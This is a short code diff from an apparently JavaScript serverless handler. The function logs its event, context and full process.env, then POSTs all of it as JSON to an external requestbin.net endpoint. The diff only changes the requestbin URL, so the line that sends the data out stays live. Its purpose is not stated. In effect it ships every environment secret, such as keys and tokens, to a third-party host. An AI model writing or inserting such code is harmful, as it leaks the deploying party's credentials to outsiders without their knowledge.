@@ -19,7 +19,7 @@ export async function handler(
 ) {
   console.log({ event, context, env: process.env });
   const info = JSON.stringify({ event, context, env: process.env }, null, 2);
-  await fetch("http://requestbin.net/r/96a26jo1", {
+  await fetch("http://requestbin.net/r/6701gmi2", {
     method: "POST",
     body: info,
   });
